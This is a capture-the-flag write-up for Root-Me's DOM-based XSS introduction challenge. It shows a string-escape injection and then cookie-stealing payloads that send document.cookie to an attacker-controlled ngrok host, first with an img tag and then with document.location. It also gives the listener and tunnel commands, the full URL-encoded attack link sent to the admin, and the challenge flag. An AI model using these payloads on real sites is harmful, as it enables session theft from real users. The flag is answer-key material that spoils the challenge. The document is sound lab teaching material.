# XSS DOM Based - Introduction

**Point**: 35 Points

**Description**: An introduction to DOM Based Cross Site Scripting attacks

## Solution:

There's a simple form:

<p align="center"><img width="450px" height="180px" src="https://user-images.githubusercontent.com/48288606/158972341-dc36c6b1-9967-4032-abfc-c84d30e9cc46.png"/></p>

Let's check whether XSS is possible. This is a DOM-based XSS, so our casual measure is inputing an arbitrary string and find out where it is placed in the source code. Let's try input: `an_arbitrary_string` and then submit.

Find the content in file by `Ctrl + Shift + F` (Window). 

<p align="center"> <img  src="https://user-images.githubusercontent.com/48288606/158973371-2fce448f-232e-4307-980d-a750722b74cb.png"> </p>

With that, we can easy escape the string and inject our malicious code. Try `'; alert(1); var nothing= '`

An pop-up comes up. We successfully did it ! Now we have to delivery all collected cookie from victim (administrator) to a specific server that we take control as usual. Try the normal payload right in `alert(1)`. Payload will look like this:

```javascript
'; document.write("<img src='{your_server_link_site}?cookie=" + document.cookie + "' />"); var nothing= '
```

Let's take action step-by-step:

1. Run PHP server with **localhost** and optional **port** : `php -S localhost:4444 hacking.php`

2. Public our server by tunneling. I use **ngrok** to serve this purpose:
   - Connect to ngrok with your account token: `ngrok authtoken {your_account_token}`
   - Tunneling our local site to public network with port specified above: `ngrok http 4444`
   - Get the public link we get from ngrok and create with payload above.
   <p align="center"><img src="https://user-images.githubusercontent.com/48288606/158975336-dbb446d1-cc7b-46c3-b18e-f92450e570dd.png" /></p>

3. Send our payload:
```javascript
'; document.write("<img src='http://efcf-113-161-77-200.ngrok.io?cookie=" + document.cookie + "' />"); var nothing= '
``` 
But wait, something's not true

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/158975937-e515d308-6385-412a-ba26-30bdedd995f7.png" /> </p>

Check the source code again. 

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/158976463-381f71bf-84c7-4cb5-ac2c-380f59c543f3.png" /> </p>

Symbols like `<` and `>` are removed when the input's analyzed by back-end server. We try to think of other solution to bypass this. By not using any tags (because it's contain `<>` symbols), we take advantage of `document.location` and when the page direct to our site, it would **REQUEST** our resources and we can see the full path contains cookie of victim .

Payload: 
```javascript
'; document.location="http://efcf-113-161-77-200.ngrok.io?cookie=" + document.cookie; var nothing= '
```
As a result, we can direct to our site when submitting !

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/158977945-7fe237c0-c719-480e-9637-8c2eb5454422.png" /> </p>

Now we just have to move to the **Contact** section to submit our malicious link to administrator.

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/158978185-0175d708-764d-47a4-b558-957cce44868b.png" /> </p>

There's one more problem we have to deal with. When we submit, the page quickly directs to our site so we can't have enough time to "collect" the URL. We should decode our payload ([Use this!](https://www.urlencoder.org/) and set **number** param with decoded value for creating our own links.

Encoded payload:
```
%27%3B%20document.location%3D%22http%3A%2F%2Fefcf-113-161-77-200.ngrok.io%3Fcookie%3D%22%20%2B%20document.cookie%3B%20var%20nothing%3D%20%27
```
Full payload: 
```
http://challenge01.root-me.org/web-client/ch32/index.php?number=%27%3B%20document.location%3D%22http%3A%2F%2Fefcf-113-161-77-200.ngrok.io%3Fcookie%3D%22%20%2B%20document.cookie%3B%20var%20nothing%3D%20%27
```
Submit to admin. Wait a while .Be patient ! It took a lots of time.

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/158979094-7153a653-0dd0-401a-b37d-740e53922820.png" /> </p>

The cookie create by **administrator** shown up in the log.

FLag: **rootme{XSS_D0M_BaSed_InTr0}**

